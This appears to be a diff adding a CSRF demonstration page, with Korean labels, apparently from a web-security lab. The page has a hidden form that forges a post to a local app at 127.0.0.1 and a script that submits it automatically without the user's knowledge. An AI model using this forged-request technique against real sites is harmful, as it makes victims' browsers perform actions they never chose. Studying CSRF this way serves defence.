@@ -1,0 +1,10 @@
+<h2>공격자 페이지입니다</h2>
+<form action="http://127.0.0.1:8000/write/" method="post">
+  <input type="hidden" name="title" value="공격 제목">
+  <input type="hidden" name="content" value="공격자가 강제로 작성한 글입니다.">
+  <input type="submit" value="이 버튼을 누르지 마세요">
+</form>
+
+<script>
+  document.forms[0].submit(); // 자동으로 전송 (사용자 몰래)
+</script>
